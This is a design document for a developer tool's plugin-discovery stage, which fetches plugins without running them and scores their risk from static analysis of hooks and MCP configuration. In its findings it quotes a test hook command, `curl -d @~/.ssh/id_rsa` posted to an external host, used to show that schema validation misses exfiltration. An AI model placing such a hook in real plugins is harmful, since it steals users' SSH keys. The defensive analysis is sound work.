# Capability discovery — design

Written 2026-08-09. Slice 4 of four, and the last to be built: it is useless
until the router, the completion gate, and the ledger can act on what it finds.

Answers: **how does Felix learn what is worth having, and how does it judge
something before recommending it?**

## The problem

`engine/harness/templates/catalog.tsv` is fifteen hand-written rows. Everything
outside it is handed off to `/claude-code-setup:claude-automation-recommender`,
which is a reasonable escape hatch and not a system.

Meanwhile `claude plugin list --json --available` returns **273 plugins** on this
machine. The catalogue covers about five percent of one marketplace, and the
gap grows every week without anyone noticing.

## What the platform gives us, and what it does not

Verified on 2.1.226. These findings determine the whole design, so they are
stated before it.

**The available-plugin listing carries no risk information.** Real field set
across all 273 uninstalled entries:

```
pluginId  name  description  marketplaceName  source  version  installCount
```

No `hooks`. No `mcpServers`. Those appear only on *installed* entries. So
nothing about what a plugin actually does is visible from the catalogue — but
`source` carries `{source: "git-subdir", url, path, ref, sha}`, which is enough
to fetch and read it.

**`claude plugin validate` checks schema, not behaviour.** A plugin was
constructed whose hook runs `curl -d @~/.ssh/id_rsa` to an external host.
`validate` **passed it**, warning only that the version field was missing. It
never parses hook commands or MCP definitions.

**There is no permission model. At all.** Inventing `permissions` and
`capabilities` fields in a `plugin.json` produces this from the validator:

> `permissions: Unknown field 'permissions'. Claude Code ignores it at load time.`

Installing a plugin is unconditionally granting arbitrary code execution: hooks
run shell commands as you, every session; MCP server definitions interpolate
`${ENV_VAR}` into headers sent to whatever URL the author chose. Notably the
*Codex* manifest shipped in the same repositories does have
`interface.capabilities`; Claude Code's format does not.

**`claude plugin eval` cannot serve as a sandbox.** It is early-access gated and
returns an error on every invocation here. Its own help describes running
author-supplied bash "as you," and claims no isolation. Any design step called
"sandbox evaluation" would be describing something that does not exist.

**One useful surprise:** `claude --plugin-dir <path> plugin details <name>` works
on a plugin that was never installed. So a component inventory — how many hooks,
which events, how many MCP servers, projected token cost — is obtainable from a
fetched checkout without touching the plugin registry.

## Consequence: Felix has to build the evaluation step

The reviewer's `Discover → Evaluate → Recommend` is the right shape, and the
middle stage has no platform support whatsoever. It has to be static analysis of
fetched source, and it has to be honest about its ceiling.

```
enumerate            claude plugin list --json --available
      ↓              + marketplaces Felix knows
match to project     capability gating, the same rule stack.tsv already uses
      ↓
fetch at pinned sha  git, shallow, into a scratch directory. Never executed
      ↓
read three files     plugin.json · hooks/hooks.json · .mcp.json
      ↓
derive risk          from what those files say, not from the description
      ↓
recommend            a row you could add. Felix does not add it
      ↓
you install          and the existing high-risk rule still refuses to help
```

Fetching is `git clone --depth 1` at the recorded `sha` into a scratch directory
that is read and deleted. Nothing from it is executed, sourced, or added to a
path. That distinction — fetched and read, never run — is the entire safety
argument for the stage, and any change that weakens it invalidates this design.

## What static analysis can actually determine

Each of these is a fact from a file, not a judgment:

| Check | Signal | Why it matters |
|---|---|---|
| Ships hooks at all | `hooks/hooks.json` exists | Hooks are shell commands run on your machine every session, before you type anything. This alone is the largest single risk jump |
| Which hook events | event names in that file | A `PreToolUse` hook sees every tool call and can block them |
| Hook command text | the literal command strings | Read them. Network calls, credential paths, and pipes to shells are visible in plain text |
| MCP transport | `command`/`args` vs `type: http`/`url` | A local subprocess and a remote endpoint are different exposures |
| Floating versions | `@latest`, unpinned refs, bare tags | `playwright` runs `npx @playwright/mcp@latest` — the code executed can change with no manifest change and no update notice |
| Secrets into headers | `${VAR}` inside `headers` | The `github` plugin sends `${GITHUB_PERSONAL_ACCESS_TOKEN}` to a remote URL. Legitimate, and exactly the shape of exfiltration |
| Source pinning | `sha` present vs a moving `ref` | Whether what you evaluated is what you will install |
| Popularity | `installCount` | Weak. Self-reported by the catalogue author, ungamed only by assumption |
| Author and repository | `plugin.json` fields | Self-reported. Not identity |

Those map onto Felix's existing three tiers, which already exist in `stack.tsv`
and already carry the rule that matters:

- **low** — skills only, no hooks, no MCP servers.
- **medium** — MCP over a pinned local command, or an HTTP server with no secret
  interpolation.
- **high** — ships hooks, interpolates a credential, uses a floating version, or
  reaches production/money. `FELIX_RISK_AUTO` already excludes high from every
  automation flag: "no flag installs those" is existing behaviour, not something
  this design adds.

## The ceiling, stated plainly

Static analysis catches accidents and carelessness. It does not catch an
attacker.

A plugin that ships no hooks, pins its versions, interpolates no secrets, and
passes every check above can still do anything it likes the moment it runs,
because there is no permission boundary to hold it to any of that. Nothing in
this design changes that, and no arrangement of the available primitives could.

What it buys: you find out that something ships hooks *before* you install it
rather than never, and a plugin that floats its own dependencies is flagged
rather than silently updated. That is worth having and it is not security.

The spec says this so that a later reader does not mistake a risk tier for a
guarantee.

## Never installs

`felix discover` prints rows. It does not write `stack.tsv`, does not call
`claude plugin install`, and takes no `--yes`.

This differs deliberately from `felix stack apply`, which does install — because
by then a human has already decided the row belongs in the manifest. Discovery
is upstream of that decision, and a discovery step that installed would make the
manifest a formality.

Auto-installing low-risk finds is a coherent future step once the record shows
the risk tiers are trustworthy — the same earned-autonomy ladder as
`felix automerge` (five clean merges) and `felix unattended` (which refuses to
enable itself). It is not this design, and the ladder should be earned in the
same way: by a record, not by a flag.

## Cadence

On demand: `felix discover`, `felix discover --want "<text>"`.

Periodically: a `maintenance.tsv` row, so it surfaces in `felix maintenance`
alongside dependency updates rather than needing to be remembered. The existing
maintenance machinery already handles cadence, recording, and reporting.

The ledger supplies the other half — "you have had `playwright` mounted for 40
sessions and used it three times" belongs in the same report as "there is a
plugin that would cover what you keep doing by hand." Discovery without the
ledger only ever adds.

## Project-agnostic by construction

Matching a candidate to a project reuses the capability gating already in
`stack.tsv` and `felix doctor`: a database plugin is only proposed once
`database` is a declared capability. That machinery contains no language
knowledge — it keys off detected surfaces — so a Rust project and a Django
project get different recommendations through the same code path.

Fetching requires `git`, already a dependency. Nothing else is assumed.

## Error handling

| Condition | Behaviour |
|---|---|
| Network unavailable | Report what the catalogue already knew, skip fetch-dependent checks, say so |
| A fetch fails | Skip that candidate, name it, continue |
| Scratch directory unwritable | Fall back to catalogue-only, mark every row `unevaluated` |
| `plugin.json` malformed | Treat as **high** risk. Unparseable is not benign |
| No `sha` in `source` | Evaluate the moving ref, and say the evaluation may not describe what gets installed |
| Candidate already declared | Omit silently |
| Marketplace unreachable | Report, exit 0. Discovery is never on a critical path |

Everything degrades to reporting less. Nothing degrades to recommending more.

## Testing

Against fixture plugin directories in the test harness, never the network.

1. A candidate with only skills is scored low.
2. A candidate shipping `hooks/hooks.json` is scored high, regardless of what the hooks do.
3. A candidate with `npx pkg@latest` is scored high and the reason names the floating version.
4. A candidate interpolating `${TOKEN}` into `headers` is scored high and the reason names the credential.
5. A candidate with a pinned local MCP command and no hooks is scored medium.
6. A malformed `plugin.json` is scored high, not skipped.
7. A candidate whose capability is not declared for the project is omitted.
8. `felix discover` writes nothing — assert `stack.tsv` is byte-identical afterwards.
9. `felix discover` accepts no `--yes` and errors if given one.
10. A failed fetch names the candidate and does not abort the run.
11. Offline, the command exits 0 and marks rows `unevaluated`.
12. The scratch directory is deleted afterwards, including on failure.
13. No fixture plugin's code is executed — assert by using a fixture whose hook would create a sentinel file, and asserting the sentinel does not exist.

Test 13 is the one that guards the design's only real safety property. If it
ever fails, the stage has stopped being static analysis.

## Files

New:

```
engine/harness/lib/discover.sh
engine/harness/templates/discover-rules.tsv     the static checks and their tiers
```

Changed:

```
engine/harness/felix                 + cmd_discover
engine/harness/templates/maintenance.tsv   + a discovery cadence row
engine/harness/tests/run
```

`catalog.tsv` stays. It becomes the curated floor — the rows Felix is confident
about for any project — with discovery layered above it rather than replacing it.

## Known limits

- **One marketplace.** All 273 available plugins here come from
  `claude-plugins-official`. MCP servers outside the plugin system are not
  enumerable this way at all; the `mcp-registry` tools available in-session
  returned empty for every query tried. Discovery covers plugins well and MCP
  servers only where a plugin ships one.
- **`installCount` is not a trust signal** and must never be presented as one.
  It is a number supplied by the same party supplying the plugin.
- **Static analysis has the ceiling described above.** Repeated here because it
  is the thing most likely to be forgotten once the output starts looking
  authoritative.
- **Fetching costs time and network.** Evaluating 273 candidates is not a
  session-time operation. Discovery runs on the maintenance cadence, evaluates
  only capability-matched candidates, and caches by `sha` — an evaluation of a
  pinned commit never needs repeating.
